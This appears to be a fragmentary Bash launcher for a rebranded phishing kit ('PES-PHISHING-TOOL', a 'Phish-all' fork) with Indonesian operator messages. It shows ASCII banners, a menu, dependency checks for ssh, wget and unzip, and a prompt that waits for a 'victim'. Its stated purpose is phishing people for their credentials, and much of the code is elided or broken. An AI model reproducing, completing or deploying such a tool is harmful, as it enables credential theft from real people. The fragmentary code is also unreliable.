# Coded by: linux_choice (You dont # Phish-all
# Upgrade By CIVIL HACKER
trap 'printf "\n";stop;exit 1' 2
...
menu() {
echo '          TYPE  8  IN TERMINAL' | lolcat
echo '         <×====================×>' | lolcat
echo '
 ========]
 |_____|
...
echo '<×<><><><><><><><><><><><><><><><><><>=×>' | lolcat
echo '        <==PES-PHISHING-TOOL-BY-SHIRF4N-MLP==>' | lolcat
echo '<×<><><><><><><><><><><><><>><><><><><>×>' | lolcat
echo 'SHIRU-MODS' | lolcat
echo '<×=<><><><><><><><><><><><><>=×>' | lolcat
echo '8.TYPE8' | lolcat
echo '<×=<><><><><><><><><><><><><>=×>' | lolcat
echo '8.TYPE' | lolcat
...
printf "\e[1;93m GAK ADA NJENG\e[0m\n"
sleep 1
clear
menu
fi
...
SHIRU-MODS™ SHIRU-MODS™ SHIRU-MODS™ SHIRU-MODS™ SHIRU-MODS™™™™™™™™™™™™™™™™
   ...
   ______   __    __  ______  _______   ________   ______   __    __ 
 /      \ |  \  |  \|      \|       \ |        \ /      \ |  \  |  \
|  $$$$$$\| $$  | $$ \$$$$$$| $$$$$$$\| $$$$$$$$|  $$$$$$\| $$\ | $$
| $$___\$$| $$__| $$  | $$  | $$__| $$| $$__    | $$__| $$| $$$\| $$
 \$$    \ | $$    $$  | $$  | $$    $$| $$  \   | $$    $$| $$$$\ $$
...
printf "\n"
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Tunggu Korban, Press Ctrl + C to exit...\e[0m\n"
...
command -v ssh > /dev/null 2>&1 || { echo >&2 "Woy Anjeng SSH belum Kau Install."; exit 1; }
if [[ -e sendlink ]]; then
rm -rf sendlink
fi
...
command -v unzip > /dev/null 2>&1 || { echo >&2 "Woy Ajeng Belum Kau Install Ni"; exit 1; }
command -v wget > /dev/null 2>&1 || { echo >&2 "Woy Anjeng Wget Belum Kau Install."; exit 1; }
...
printf "\e[1;93m[!] Download Gagal... Termux, Install:\e[0m\e[1;77m pkg install wget\e[0m\n"
exit 1
fi
...
printf "\e[1;93m[!] Download Gagal... \e[0m\n"
exit 1
fi
fi
fi
...
read -p $'\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Pilih Mana Njeng: \e[0m\en' option_server
